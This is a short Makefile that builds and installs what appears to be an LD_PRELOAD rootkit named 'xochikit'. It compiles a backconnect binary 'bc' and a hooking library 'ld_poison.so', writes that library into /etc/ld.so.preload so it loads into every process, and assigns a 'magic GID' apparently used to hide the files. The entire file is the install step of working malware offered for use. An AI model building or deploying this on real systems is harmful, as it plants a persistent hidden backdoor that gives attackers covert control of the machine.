INSTALL=/xochikit
MAGIC_GID=90

all: bc ld_poison.so

bc: bc.c config.h
	gcc -Wall -o bc bc.c -lpcap -lssl

ld_poison.so: ld_poison.c config.h
	gcc -Wall -fPIC -shared -ldl ld_poison.c -o ld_poison.so

install: all
	@echo [-] Initiating Installation Directory $(INSTALL)
	@test -d $(INSTALL) || mkdir $(INSTALL)
	@echo [-] Installing bc and ld_poison.so
	@install -m 0755 bc ld_poison.so $(INSTALL)/
	@echo [-] Injecting ld.so.preload
	@echo $(INSTALL)/ld_poison.so > /etc/ld.so.preload	
	@echo [-] Morphing Magic GID \($(MAGIC_GID)\)
	@chgrp $(MAGIC_GID) $(INSTALL_DIR) $(INSTALL)/*

clean:
	rm ld_poison.so bc

